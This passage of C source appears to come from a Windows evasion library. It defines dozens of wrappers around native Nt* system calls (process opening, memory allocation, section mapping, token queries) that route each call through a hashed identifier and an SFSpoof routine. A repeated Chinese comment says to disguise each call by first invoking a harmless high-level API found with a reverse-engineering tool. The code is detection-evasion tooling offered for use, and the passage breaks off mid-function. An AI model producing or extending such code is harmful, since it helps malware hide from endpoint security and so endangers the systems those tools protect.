NTSTATUS SFNtQueryObject(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)Handle;
    Params.param[2] = (DWORD_PTR)ObjectInformationClass;
    Params.param[3] = (DWORD_PTR)ObjectInformation;
    Params.param[4] = (DWORD_PTR)ObjectInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x00A553EF4;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)FileInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)FileInformationClass;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x02218B021;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0BDB8EA66;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)Index;
    Params.param[3] = (DWORD_PTR)KeyValueInformationClass;
    Params.param[4] = (DWORD_PTR)KeyValueInformation;
    Params.param[5] = (DWORD_PTR)Length;
    Params.param[6] = (DWORD_PTR)ResultLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0281F4D85;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFindAtom(PWSTR AtomName, ULONG Length, PUSHORT Atom) {
    Params.param[1] = (DWORD_PTR)AtomName;
    Params.param[2] = (DWORD_PTR)Length;
    Params.param[3] = (DWORD_PTR)Atom;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x038A00921;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryDefaultLocale(BOOLEAN UserProfile, PLCID DefaultLocaleId) {
    Params.param[1] = (DWORD_PTR)UserProfile;
    Params.param[2] = (DWORD_PTR)DefaultLocaleId;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0C32AF1FD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryKey(HANDLE KeyHandle, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)KeyInformationClass;
    Params.param[3] = (DWORD_PTR)KeyInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)ResultLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x09F0BB2AD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)ValueName;
    Params.param[3] = (DWORD_PTR)KeyValueInformationClass;
    Params.param[4] = (DWORD_PTR)KeyValueInformation;
    Params.param[5] = (DWORD_PTR)Length;
    Params.param[6] = (DWORD_PTR)ResultLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0261BD761;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)ZeroBits;
    Params.param[4] = (DWORD_PTR)RegionSize;
    Params.param[5] = (DWORD_PTR)AllocationType;
    Params.param[6] = (DWORD_PTR)Protect;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x00114EF73;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)ProcessInformationClass;
    Params.param[3] = (DWORD_PTR)ProcessInformation;
    Params.param[4] = (DWORD_PTR)ProcessInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0DD27CE88;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitForMultipleObjects32(ULONG ObjectCount, PHANDLE Handles, WAIT_TYPE WaitType, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)ObjectCount;
    Params.param[2] = (DWORD_PTR)Handles;
    Params.param[3] = (DWORD_PTR)WaitType;
    Params.param[4] = (DWORD_PTR)Alertable;
    Params.param[5] = (DWORD_PTR)Timeout;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0B49D2D72;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWriteFileGather(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PFILE_SEGMENT_ELEMENT SegmentArray, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)SegmentArray;
    Params.param[7] = (DWORD_PTR)Length;
    Params.param[8] = (DWORD_PTR)ByteOffset;
    Params.param[9] = (DWORD_PTR)Key;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x0039C6F07;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG TitleIndex, PUNICODE_STRING Class, ULONG CreateOptions, PULONG Disposition) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)TitleIndex;
    Params.param[5] = (DWORD_PTR)Class;
    Params.param[6] = (DWORD_PTR)CreateOptions;
    Params.param[7] = (DWORD_PTR)Disposition;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x01D1D3CA6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)RegionSize;
    Params.param[4] = (DWORD_PTR)FreeType;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x00596110B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtImpersonateClientOfPort(HANDLE PortHandle, PPORT_MESSAGE Message) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Message;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0E0BED113;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReleaseMutant(HANDLE MutantHandle, PULONG PreviousCount) {
    Params.param[1] = (DWORD_PTR)MutantHandle;
    Params.param[2] = (DWORD_PTR)PreviousCount;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x038BE3338;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationToken(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)TokenInformationClass;
    Params.param[3] = (DWORD_PTR)TokenInformation;
    Params.param[4] = (DWORD_PTR)TokenInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x004027081;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRequestWaitReplyPort(HANDLE PortHandle, PPORT_MESSAGE RequestMessage, PPORT_MESSAGE ReplyMessage) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)RequestMessage;
    Params.param[3] = (DWORD_PTR)ReplyMessage;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x062BC6320;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)MemoryInformationClass;
    Params.param[4] = (DWORD_PTR)MemoryInformation;
    Params.param[5] = (DWORD_PTR)MemoryInformationLength;
    Params.param[6] = (DWORD_PTR)ReturnLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x003910903;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenThreadToken(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, PHANDLE TokenHandle) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)OpenAsSelf;
    Params.param[4] = (DWORD_PTR)TokenHandle;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x001D87B3C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)ThreadInformationClass;
    Params.param[3] = (DWORD_PTR)ThreadInformation;
    Params.param[4] = (DWORD_PTR)ThreadInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x022163CA7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)ClientId;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0FEA4D138;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)FileInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)FileInformationClass;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x015852515;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
    Params.param[1] = (DWORD_PTR)SectionHandle;
    Params.param[2] = (DWORD_PTR)ProcessHandle;
    Params.param[3] = (DWORD_PTR)BaseAddress;
    Params.param[4] = (DWORD_PTR)ZeroBits;
    Params.param[5] = (DWORD_PTR)CommitSize;
    Params.param[6] = (DWORD_PTR)SectionOffset;
    Params.param[7] = (DWORD_PTR)ViewSize;
    Params.param[8] = (DWORD_PTR)InheritDisposition;
    Params.param[9] = (DWORD_PTR)AllocationType;
    Params.param[10] = (DWORD_PTR)Win32Protect;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x0E0C7A011;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAccessCheckAndAuditAlarm(PUNICODE_STRING SubsystemName, PVOID HandleId, PUNICODE_STRING ObjectTypeName, PUNICODE_STRING ObjectName, PSECURITY_DESCRIPTOR SecurityDescriptor, ACCESS_MASK DesiredAccess, PGENERIC_MAPPING GenericMapping, BOOLEAN ObjectCreation, PACCESS_MASK GrantedAccess, PBOOLEAN AccessStatus, PBOOLEAN GenerateOnClose) {
    Params.param[1] = (DWORD_PTR)SubsystemName;
    Params.param[2] = (DWORD_PTR)HandleId;
    Params.param[3] = (DWORD_PTR)ObjectTypeName;
    Params.param[4] = (DWORD_PTR)ObjectName;
    Params.param[5] = (DWORD_PTR)SecurityDescriptor;
    Params.param[6] = (DWORD_PTR)DesiredAccess;
    Params.param[7] = (DWORD_PTR)GenericMapping;
    Params.param[8] = (DWORD_PTR)ObjectCreation;
    Params.param[9] = (DWORD_PTR)GrantedAccess;
    Params.param[10] = (DWORD_PTR)AccessStatus;
    Params.param[11] = (DWORD_PTR)GenerateOnClose;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 11;
    Params.FuncHash = 0x0D2AC33F1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0B6A3FC07;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReplyWaitReceivePortEx(HANDLE PortHandle, PULONG PortContext, PPORT_MESSAGE ReplyMessage, PPORT_MESSAGE ReceiveMessage, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)PortContext;
    Params.param[3] = (DWORD_PTR)ReplyMessage;
    Params.param[4] = (DWORD_PTR)ReceiveMessage;
    Params.param[5] = (DWORD_PTR)Timeout;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0138DCFC9;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)ExitStatus;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x049933678;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetEventBoostPriority(HANDLE EventHandle) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x054C35040;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReadFileScatter(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PFILE_SEGMENT_ELEMENT SegmentArray, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)SegmentArray;
    Params.param[7] = (DWORD_PTR)Length;
    Params.param[8] = (DWORD_PTR)ByteOffset;
    Params.param[9] = (DWORD_PTR)Key;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x025AE073F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenThreadTokenEx(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, ULONG HandleAttributes, PHANDLE TokenHandle) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)OpenAsSelf;
    Params.param[4] = (DWORD_PTR)HandleAttributes;
    Params.param[5] = (DWORD_PTR)TokenHandle;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
